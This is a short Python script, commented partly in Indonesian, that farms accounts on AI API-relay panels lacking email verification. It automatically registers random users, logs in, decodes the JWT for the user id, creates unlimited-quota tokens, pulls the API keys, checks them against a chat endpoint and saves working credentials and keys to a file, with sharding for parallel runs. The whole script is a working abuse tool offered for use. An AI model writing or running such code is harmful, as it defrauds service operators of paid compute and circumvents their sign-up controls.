#!/usr/bin/env python3
"""plain_farm.py — farm host tanpa gate (no email verif). usage: plain_farm.py HOST N SHARD"""
import sys, json, random, string, base64, time
import urllib.request, urllib.error

HOST = sys.argv[1]
N = int(sys.argv[2]) if len(sys.argv) > 2 else 10
SHARD = sys.argv[3] if len(sys.argv) > 3 else "0"
BASE = "http://" + HOST
OUT = f"plain_{SHARD}.jsonl"
UA = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}


def rq(m, p, b=None, h=None, t=40):
    r = urllib.request.Request(BASE + p, data=json.dumps(b).encode() if b is not None else None,
        method=m, headers={**UA, **(h or {})})
    try:
        with urllib.request.urlopen(r, timeout=t) as x:
            return x.status, x.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)[:60]


ok = 0
for i in range(N):
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    u = "p" + tag; pw = "P" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
    s, b = rq("POST", "/api/user/register",
              {"username": u, "password": pw, "password2": pw, "email": f"{tag}@gmail.com", "verification_code": ""})
    if '"success":true' not in b.replace(" ", ""):
        print(f"[{i}] REG_FAIL {b[:70]}", flush=True); time.sleep(2); continue
    s, lb = rq("POST", "/api/user/login", {"username": u, "password": pw})
    uid = tok = None
    try:
        dd = json.loads(lb)["data"]; uid = dd.get("id"); tok = dd.get("access_token")
        if not uid and tok:
            uid = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))["sub"]
    except Exception:
        pass
    hd = {"New-Api-User": str(uid)}
    if tok:
        hd["Authorization"] = "Bearer " + tok
    s, sf = rq("GET", "/api/user/self", h=hd)
    q = None
    try:
        q = json.loads(sf)["data"]["quota"]
    except Exception:
        pass
    rq("POST", "/api/token/", {"name": "t1", "remain_quota": 500000000, "unlimited_quota": True,
       "expired_time": -1, "model_limits_enabled": False, "group": ""}, hd)
    s, tl = rq("GET", "/api/token/?p=0&size=20", h=hd)
    key = None
    try:
        it = json.loads(tl)["data"]["items"][-1]
        s, kk = rq("POST", f"/api/token/{it['id']}/key", h=hd)
        key = json.loads(kk)["data"]["key"]
    except Exception:
        pass
    live = False
    if key:
        s, cb = rq("POST", "/v1/chat/completions",
                   {"model": "deepseek-flash", "messages": [{"role": "user", "content": "PONG"}], "max_tokens": 10},
                   {"Authorization": "Bearer " + key})
        try:
            m = json.loads(cb)["choices"][0]["message"]
            live = bool(m.get("content") or m.get("reasoning_content"))
        except Exception:
            pass
    rec = {"host": HOST, "verdict": "LIVE" if live else ("KEY_NO_CHAT" if key else "NO_KEY"),
           "user": u, "pass": pw, "uid": uid, "quota": q, "key": key}
    if live:
        ok += 1
    if key:
        open(OUT, "a").write(json.dumps(rec, ensure_ascii=False) + "\n")
    print(f"[{i}] {rec['verdict']} q={q} key={str(key)[-8:] if key else '-'}", flush=True)
    time.sleep(1.5)
print(f"DONE shard={SHARD} live={ok}/{N}")
